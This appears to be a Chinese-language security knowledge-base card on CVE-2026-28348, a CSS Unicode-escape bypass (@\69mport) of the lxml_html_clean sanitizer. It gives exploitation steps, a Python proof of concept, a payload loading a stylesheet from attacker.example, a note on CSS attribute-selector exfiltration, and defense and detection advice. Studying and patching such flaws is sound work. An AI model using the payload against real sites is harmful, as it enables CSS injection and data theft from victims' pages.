---
id: web-generic-xss-lxml-html-clean-css-unicode-escape-import
title: lxml_html_clean 先删反斜杠再匹配 @import：CSS Unicode 转义 @\69mport 绕过清理器（CVE-2026-28348）
type: scenario
domain: web
path: web/generic/xss
technique: css-unicode-escape-after-backslash-strip
tags:
- xss
- css-injection
- lxml-html-clean
- python
- sanitizer-bypass
- css-escape
- lexical-desync
- cve-2026-28348
cve:
- CVE-2026-28348
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: lxml_html_clean < 0.4.4
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:32:28+08:00'
  notes: 已对照原文与图25-32核对：v0.4.3 _has_sneaky_javascript 先 style.replace('\','') 再匹配，@\69mport 变 @69mport 导致 @import 检查不命中；浏览器 CSS 词法器把 \69 解码为 i 后加载外部样式表；图29服务端日志出现 GET /HACKED_BY_CSS_ESCAPE，图28页面无JS弹窗，卡内已明确按CSS注入/外部资源加载定级、不宣称任意JS执行，severity/confidence medium合理；修复0.4.4引入_decode_css_unicode_escapes再lower/黑名单，与图30-32一致；affected_versions <0.4.4与原文一致。PoC未在本机执行。frontmatter 无 sources/source_url。
url: /docs/web/generic/xss/web-generic-xss-lxml-html-clean-css-unicode-escape-import/
draft: false
kb_aliases:
- CVE-2026-28348
- lxml_html_clean CSS 逃逸
- '@\69mport'
- CSS Unicode 转义绕过
- '@import 黑名单绕过'
- 中间态去转义
---

## 一句话结论

lxml_html_clean `<0.4.4` 的 `_has_sneaky_javascript` 在匹配 `@import` 前先 `style.replace('\\', '')` 删除所有反斜杠，而浏览器 CSS 词法器会把 `\69` 解码为 `i`；提交 `@\69mport url(...)` 时清理器看到 `@69mport` 而判定安全，浏览器最终看到 `@import`，从而把攻击者指定的外部样式表加载进受害者页面，形成 CSS 注入绕过。

## 原理

- CSS 语法支持 Unicode 转义：`\` 后跟 1–6 位十六进制数字表示对应码点，`\69` 即字母 `i`，`@\69mport` 与 `@import` 在浏览器词法层等价。
- 旧版 `_has_sneaky_javascript` 的防御思路是“删除反斜杠，防止 `j\a\v\a...` 之类拆分关键字”，执行 `style = style.replace('\\', '')` 后再做 `@import`、`expression(`、`javascript:` 等子串匹配。
- 删除反斜杠后 `@\69mport` 变成 `@69mport`，与 `@import` 不匹配，检查返回 `False`，整个 `<style>` 被放行。
- 但放行的是**原始字符串**：浏览器拿到的仍是 `@\69mport`，CSS 词法器按规范解码 `\69` 为 `i`，得到真正的 `@import` 指令并去加载指定 URL。
- 根因是“先做有损字符串替换、再做语义匹配”：清理器与浏览器对同一份输入的解码规则不一致，且替换操作破坏了攻击者字符串但没破坏浏览器眼中的语义。

## 触发条件

- 使用 lxml_html_clean `<0.4.4`，且清理配置保留 `style` 内容（如 `style=False` 表示不过滤 style 标签）。
- 用户可控内容能进入 `<style>` 标签或 style 属性，并经 `Cleaner.clean_html` 后原样输出。
- 浏览器支持 CSS `@import`（常规浏览器均支持）。
- 若要进一步执行 JS，还需要绕过 `_has_javascript_scheme`（直接写 `javascript:` 会被该检查命中；本文实际 PoC 加载的是外部 HTTP 样式表，未证明 `javascript:` 可执行）。

## 利用步骤

1. 找到把用户 HTML/CSS 交给 lxml_html_clean 清理并回显的功能，例如主题 CSS 预览、富文本样式白名单。
2. 提交 `<style>@\69mport url("http://attacker.example/x.css");</style>`。
3. 清理器删除反斜杠后得到 `@69mport`，`@import` 子串检查失败，内容被保留。
4. 浏览器解析输出，CSS 词法器把 `\69` 还原为 `i`，执行 `@import`，向攻击者服务器请求样式表。
5. 通过外部样式表实施 CSS 注入：覆盖页面样式、用属性选择器配合背景请求逐字符外带敏感属性值，或做 UI 伪装。
6. 变体：若目标浏览器/上下文允许 `javascript:` URL 且能同时编码 `javascript` 关键字以绕过 scheme 检查，才可能进一步执行脚本；此点本文未验证。

## PoC

```python
from lxml.html import document_fromstring, tostring
from lxml_html_clean import Cleaner

cleaner = Cleaner(javascript=True, style=False, inline_style=False, page_structure=False)
payload = '<html><style>@\\69mport url("http://127.0.0.1:5000/HACKED_BY_CSS_ESCAPE");</style></html>'
doc = document_fromstring(payload)
cleaner.clean_html(doc)
print(tostring(doc, encoding='unicode'))
# 输出仍是 @\69mport ...，清理器未拦截
```

浏览器打开输出页面后，服务端访问日志出现对 `http://127.0.0.1:5000/HACKED_BY_CSS_ESCAPE` 的 GET 请求，证明清理器被绕过且外部样式表被加载。原文截图确认了该请求，但页面未出现 JS 弹窗，故本卡按“CSS 注入/外部资源加载”定级，不宣称任意 JS 执行。

## 变体与关联

- 其它 CSS 转义写法：`\000069mport`、`\69\r\nmport` 等，浏览器同样按 CSS 规范解码；清理器若只删除反斜杠仍会漏判。
- 同类有损处理：删除注释、压缩空白、`lower()` 之前未按浏览器词法解码，都可能造成正则态与解释器态不一致。
- 与 [[web-generic-xss-filter-bypass-encoding-obfuscation]] 的字符层混淆思路同源；区别是本卡利用 CSS 词法器的十六进制转义，而非 HTML 实体。
- 与 [[web-generic-xs-leaks-css-attribute-selector-exfil]] 可组合：先绕过清理器注入 `<style>`，再用属性选择器外带数据。

## 检测与防御

- 升级 lxml_html_clean 到 `0.4.4+`；修复版用 `_decode_css_unicode_escapes` 先按 CSS 规范解码 `\69`、`\000069`、`\69\r\n` 等，再小写化并做黑名单匹配。
- 防御原则：任何黑名单匹配都必须作用于与浏览器解释器一致的规范化字符串；不要用 `replace('\\','')` 这类有损操作代替词法解码。
- 更稳妥的做法是白名单化 CSS：用成熟 CSS parser 解析，只允许已知属性和值；对 `url()`、`@import` 做协议与来源限制。
- 输出前用 DOMPurify 等基于浏览器解析器的 sanitizer 兜底；限制 `style` 标签与内联样式的使用范围。
- 审计：搜索 `style.replace('\\'`、`_has_sneaky_javascript`、`@import` 子串检查等模式；确认检查对象和最终输出是同一份未再变换的字符串。
- 运行时检测：响应中出现 `\` 后跟十六进制数字的 CSS 转义、`@import` 指向外部域，或页面加载非预期的第三方样式表。
